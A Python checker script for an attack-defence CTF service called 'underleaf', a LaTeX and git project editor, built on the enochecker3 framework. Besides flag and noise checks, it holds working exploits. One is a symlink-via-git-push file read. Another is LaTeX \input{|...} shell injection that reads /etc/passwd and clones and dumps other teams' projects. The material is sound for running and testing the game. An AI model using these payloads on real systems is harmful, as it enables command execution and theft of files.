import secrets
import json
import os
from typing import Optional, Tuple
from logging import LoggerAdapter
import hashlib

from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, PutnoiseCheckerTaskMessage, GetnoiseCheckerTaskMessage, ChainDB, MumbleException, FlagSearcher
from enochecker3.utils import assert_equals, assert_in
from util import *

checker = Enochecker("underleaf", service_port)
def app(): return checker.app

@checker.putflag(0)
async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    (_, _, _, id) = await create_user_and_project(client, db, logger)

    await upload_file(client, id, "main.tex", task.flag, logger)

    await commit(client, id, "Minor changes to the layout", logger)
    await push(client, id, logger)

    return id


@checker.getflag(0)
async def getflag_zero(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> str:
    try:
        (username, password) = await db.get("credentials")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    await login_user(client, username, password, logger)

    try:
        (_, id) = await db.get("project")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")

    assert_equals(await download_file(client, id, 'main.tex', logger), task.flag, "flag dose not match")


@checker.havoc(0)
async def havoc_test_git(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    (username, password, _, id) = await create_user_and_project(client, db, logger)

    # upload a file to the project
    file_content = secrets.token_hex(32)
    await upload_file(client, id, "main.tex", file_content, logger)
    # commit the file
    await commit(client, id, "Added main.tex", logger)
    # push the change
    await push(client, id, logger)

    dev_null = "  > /dev/null 2>&1"

    # clone the repo onto the checker
    git_url = f"http://{username}:{password}@{task.address}:{service_port}/git/{id}"

    if os.system(f"git -C /tmp/ clone {git_url} {dev_null}") != 0:
        raise MumbleException("git clone failed")

    # check, that the file is present
    assert_equals(os.path.exists(f"/tmp/{id}/"), True, "git clone failed")
    assert_equals(os.path.exists(
        f"/tmp/{id}/main.tex"), True, "file not created")
    assert_equals(open("/tmp/{id}/main.tex".format(id=id)
                       ).read(), file_content, "file content does not match")

    # add a file locally
    new_file_content = secrets.token_hex(32)
    open(f"/tmp/{id}/newFile.tex", "w").write(new_file_content)

    # commit it
    os_succ(os.system(
        f"git -C /tmp/{id} config user.email \"{username}@example.com\" {dev_null}"))
    os_succ(
        os.system(f"git -C /tmp/{id} config user.name \"{username}\" {dev_null}"))

    os_succ(os.system(f"git -C /tmp/{id} add . {dev_null}"))
    os_succ(
        os.system(f"git -C /tmp/{id} commit -m 'Added newFile.tex' {dev_null}"))

    # push it onto the server
    if os.system(f"git -C /tmp/{id} push {dev_null}") != 0:
        raise MumbleException("git push failed")

    # cleanup
    os_succ(os.system(f"rm -rf /tmp/{id}/ {dev_null}"))

    # let the server pull the changes
    await pull(client, id, logger)

    # download the file
    new_file_content_dl = await download_file(client, id, "newFile.tex", logger)
    assert_equals(new_file_content_dl, new_file_content,
                  "file content does not match")
    
    await delete_user(client, logger)

@checker.havoc(1)
async def havoc_test_latex(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter) -> None:
    (username, password, _, id) = await create_user_and_project(client, db, logger)
    file_content = """\\documentclass[12pt]{scrartcl}
\\usepackage{verbatim}
\\begin{document}
    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode; cat /etc/passwd ; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
\\end{document}
"""
    await upload_file(client, id, "main.tex", file_content, logger)
    await compile(client, id, "main.tex", logger)
    pdf_bytes = await download_pdf(client, id, logger)
    
    file = f"/tmp/{id}.pdf"
    with open(file, "wb") as f:
        f.write(pdf_bytes)

    os_succ(os.system(f"pdftotext {file} {file}.txt"))
    
    with open(f"{file}.txt", "r") as f:
        output = f.read()

    os.remove(f"{file}.txt")
    os.remove(file)

    expected_output = "root"
    assert_equals(True, output.startswith(expected_output), "output does not match")

    await delete_user(client, logger)


@checker.exploit(0)
async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, logger: LoggerAdapter) -> str:
    (username, password, _, id) = await create_user_and_project(client, None, logger)

    path = await clone_project(username, password, id, task.address)

    assert_equals(os.path.exists(
        f"{path}/main.tex"), True, "file not created")

    # add a symlink
    f_id = task.attack_info

    target = f"/app/data/projects/{f_id[0:2]}/{f_id}/main.tex"
    os_succ(os.system(f"mkdir -p {target}/.. {dev_null}"))
    os_succ(os.system(f"touch {target} {dev_null}"))
    os_succ(os.system(f"ln -s {target} /tmp/{id}/link"))
    os_succ(os.system(f"rm -rf {target} {dev_null}"))

    await git_config_commit_and_push(path, username, "Exploit!")

    await cleanup_clone(path)

    # let the server pull the changes
    await pull(client, id, logger)

    # get flag
    return await download_file(client, id, "link", logger)

@checker.exploit(1)
async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
    (username, password, _, id) = await create_user_and_project(client, None, logger)

    f_id = task.attack_info

    commands = f"git clone http://nginx-git/{f_id}; cat ./{f_id}/main.tex"

    file_content = """\\documentclass[12pt]{scrartcl}
\\usepackage{verbatim}
\\begin{document}
    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
\\end{document}
"""
    await upload_file(client, id, "main.tex", file_content, logger)
    await compile(client, id, "main.tex", logger)
    pdf_bytes = await download_pdf(client, id, logger)

    file = f"/tmp/{id}.pdf"
    with open(file, "wb") as f:
        f.write(pdf_bytes)

    os_succ(os.system(f"pdftotext {file} {file}.txt"))
    
    with open(f"{file}.txt", "r") as f:
        output = f.read()

    os.remove(f"{file}.txt")
    os.remove(file)
    
    if flag := searcher.search_flag(output):
        return flag

@checker.putnoise(0)
async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    (_, _, _, id) = await create_user_and_project(client, db, logger)

    noise_name = secrets.token_hex(16)
    noise = secrets.token_hex(32)

    await upload_file(client, id, noise_name, noise, logger)
    await db.set("noise", (noise_name, noise))


@checker.getnoise(0)
async def getnoise_file_content(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    try:
        (username, password) = await db.get("credentials")
        (name, id) = await db.get("project")
        (noise_name, noise) = await db.get("noise")
    except KeyError:
        raise MumbleException("getnoise w/o putnoise")

    await login_user(client, username, password, logger)
    if await download_file(client, id, noise_name, logger) != noise:
        raise MumbleException()
    
    await delete_user(client, logger)


@checker.putnoise(1)
async def putnoise_file_git(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    (username, password, _, id) = await create_user_and_project(client, db, logger)

    path = await clone_project(username, password, id, task.address)

    noise_name = secrets.token_hex(16)
    noise = secrets.token_hex(32)

    open(f"{path}/{noise_name}", "w").write(noise)
    await git_config_commit_and_push(path, username, "I hope i am not too loud")

    await db.set("noise", (noise_name, noise))

    await cleanup_clone(path)

    await pull(client, id, logger)


@checker.getnoise(1)
async def getnoise_file_git(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
    try:
        (username, password) = await db.get("credentials")
        (name, id) = await db.get("project")
        (noise_name, noise) = await db.get("noise")
    except KeyError:
        raise MumbleException("getnoise w/o putnoise")

    await login_user(client, username, password, logger)

    if await download_file(client, id, noise_name, logger) != noise:
        raise MumbleException("Noise not present")

    path = await clone_project(username, password, id, task.address)
    if open(f"{path}/{noise_name}", "r").read() != noise:
        raise MumbleException("Noise not present")

    await cleanup_clone(path)

    await delete_user(client, logger)


if __name__ == "__main__":
    checker.run()
